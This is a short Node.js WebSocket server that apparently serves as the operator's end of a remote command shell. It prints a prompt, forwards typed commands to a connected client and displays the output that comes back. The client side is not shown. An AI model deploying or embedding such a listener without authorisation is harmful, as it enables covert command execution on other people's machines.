const WebSocket = require("ws");
const readline = require("readline");

const wss = new WebSocket.Server({ host: "0.0.0.0", port: 8765 });

console.log("Running on ws://localhost:8765");

wss.on("connection", (ws) => {
    console.log("client connected");

    let name = "client";
    let path = "~";

    ws.once("message", (data) => {
        [path, name] = data.toString().split("|", 2);
        promptLoop();
    });

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    function ask(q) {
        return new Promise(res => rl.question(q, res));
    }

    async function promptLoop() {
        try {
            while (ws.readyState === WebSocket.OPEN) {

                if (path.endsWith(":\\")) path = path.slice(0, -2);

                let cmd = await ask(`${name}@${path}$ `);

                if (cmd === "clear" || cmd === "cls") {
                    console.clear();
                    continue;
                }

                ws.send(cmd);

                const reply = await new Promise(res => {
                    ws.once("message", msg => res(msg.toString()));
                });

                if (reply.includes("|")) {
                    [path, name] = reply.split("|", 2);
                    continue;
                }

                console.log(reply.trim());
            }
        } catch {
            console.log("\nconnection closed");
        }
    }

    ws.on("close", () => console.log("\nclient left"));
});
